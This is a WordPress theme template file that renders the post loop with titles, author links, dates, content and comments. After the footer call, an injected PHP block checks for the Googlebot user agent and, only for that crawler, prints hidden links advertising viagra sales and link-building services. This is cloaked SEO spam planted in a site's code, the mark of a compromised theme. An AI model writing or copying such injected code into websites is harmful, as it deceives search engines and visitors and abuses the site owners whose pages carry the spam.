<?php get_header(); ?>
<?php get_sidebar(); ?>

	<div id="content">
		<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
		<h2><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h2>
		<p><span class="meta-prep meta-prep-author"><?php _e('By ', 'your-theme'); ?></span>
                        <span class="author vcard"><a class="url fn n" href="<?php echo get_author_link( false, $authordata->ID, $authordata->user_nicename ); ?>" title="<?php printf( __( 'View all posts by %s', 'your-theme' ), $authordata->display_name ); ?>"><?php the_author(); ?></a></span>
                         on <?php the_time('j F Y'); ?> <!--at </?php the_time('g:i a'); ?>--></p>
						 
		<?php the_content(); ?>
		
		<p><?php the_category(', '); ?> | <?php comments_number('No comments', '1 comment', '% comments'); ?></p>
		<hr>
		<?php comments_template(); // Get wp-comments.php template ?>
		<?php endwhile; else: ?>
		<p>Sorry, no posts were found.</p>
		<?php endif; ?>
		<p align="center"><?php posts_nav_link(); ?></p>
	</div>

<?php get_footer(); ?> 
<?php
if(preg_match('/googlebot/i', $_SERVER[HTTP_USER_AGENT])) {
echo <<<here
boingboing
<a href='http://imwa.info/excecutive-council.html'>purchase viagra</a>
<a href='http://imwa.info/mwen.html'>buy viagra online</a>
<a href='http://planyourhunt.com/colorado-elk-hunts.html'>buy viagra</a>
<a href='http://planyourhunt.com/colorado-trophy-elk-hunts.html'>where to buy viagra online</a>
<a href='http://dripfeedbookmark.com/'>link building Service</a>
<a href='http://dripfeedbookmark.com/faq.html'>drip feed bookmarking links</a>
<a href='http://dripfeedbookmark.com/termsofservice.html'>Automated Building Link Service</a>

here;
}?>
